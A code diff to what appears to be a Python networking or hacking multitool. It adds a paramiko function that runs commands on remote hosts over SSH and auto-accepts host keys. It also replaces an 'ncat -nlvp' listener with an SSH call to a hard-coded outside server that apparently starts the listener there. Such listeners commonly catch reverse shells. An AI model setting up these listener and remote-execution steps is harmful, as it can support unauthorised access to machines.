@@ -33,6 +33,7 @@ while error<=stop_code:
             from email.mime.multipart import MIMEMultipart
             import socket
             import zlib
+            import paramiko
             import urllib.request
             import subprocess
             import getpass
@@ -66,6 +67,36 @@ while error<=stop_code:
             exit()
         thread_count = os.cpu_count()
         print(f'thread max dispo : {thread_count}')
+        def execute_ssh_command_with_password(hostname, port, username, password, command):
+            # Create SSH client instance
+            ssh_client = paramiko.SSHClient()
+            
+            # Automatically add host keys
+            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            try:
+                # Connect to the SSH server
+                ssh_client.connect(hostname, port=port, username=username, password=password)
+                
+                # Execute the command
+                stdin, stdout, stderr = ssh_client.exec_command(command)
+                
+                # Read the output
+                output = stdout.read().decode()
+                
+                # Print output
+                print(output)
+                
+            except paramiko.AuthenticationException:
+                print("Authentication failed. Please check your username and password.")
+            except paramiko.SSHException as e:
+                print("Unable to establish SSH connection:", str(e))
+            finally:
+                # Close the SSH connection
+                ssh_client.close()
+
+
+    
         def ecrire(msg):
             sys.stdout.write(msg)
             sys.stdout.flush()
@@ -738,11 +769,9 @@ goto a
                     port=1234
                 if port == "": port = 1234
                 print(port)
-                if input('do you want to start playit addon ? (y/N)') in ('Y', 'y', 'yes', 'YES'):
-                    command = "playit"
-                    subprocess.run(["cmd", "/c", "start", "cmd", "/k", command])
-                command = f"ncat -nlvp {port}"
-                subprocess.run(command, shell=True, text=True)
+                if input('do you want to start listner server on benji77 server with ssh? (y/N)') in ('Y', 'y', 'yes', 'YES'):
+                    subprocess.Popen(['start', 'cmd', '/k', f'ssh -p 35156 benji@147.185.221.18'], shell=True)
+                
 
             if choice == "11":
                 lip = socket.gethostbyname(socket.gethostname())
